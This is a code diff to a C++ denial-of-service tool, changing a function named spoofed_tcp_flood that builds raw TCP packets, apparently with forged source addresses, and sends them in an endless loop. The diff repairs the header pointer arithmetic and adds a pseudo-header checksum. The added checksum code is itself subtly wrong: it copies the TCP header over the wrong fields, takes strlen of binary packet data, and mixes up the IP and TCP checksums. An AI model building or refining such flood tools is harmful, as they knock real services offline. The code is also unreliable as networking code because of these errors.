@@ -455,10 +455,18 @@ void Doser::spoofed_tcp_flood(const int *id) {
     std::string message{};
     char buf[8192];
     auto *ip = (struct iphdr *)buf;
-    auto *tcp = (struct tcphdr *)buf + sizeof (struct ip);
+    auto *tcp = (struct tcphdr *)(ip + 1);
     struct hostent *hp;
     struct sockaddr_in dst{};
     auto s_port = randomInt(0, 65535);
+    struct pseudo_header{
+        unsigned int source_address;
+        unsigned int dest_address;
+        unsigned char placeholder;
+        unsigned char protocol;
+        unsigned short tcp_length;
+        struct tcphdr tcp;
+    };
     while (true){
         for(x = 0; x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
@@ -517,8 +525,17 @@ void Doser::spoofed_tcp_flood(const int *id) {
             tcp->urg_ptr = 0;
             tcp->check = 0;
 
-            ip->check = checksum((unsigned short *)buf, ip->tot_len >> 1);
+            struct pseudo_header psh{};
+            psh.source_address = ip->saddr;
+            psh.dest_address = ip->daddr;
+            psh.placeholder = 0;
+            psh.protocol = IPPROTO_TCP;
+            psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(buf));
 
+            bcopy(tcp, &psh, sizeof(struct tcphdr));
+
+            ip->check = checksum((unsigned short*) &psh , sizeof (struct pseudo_header));
+            tcp->check = ip->check;
 
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
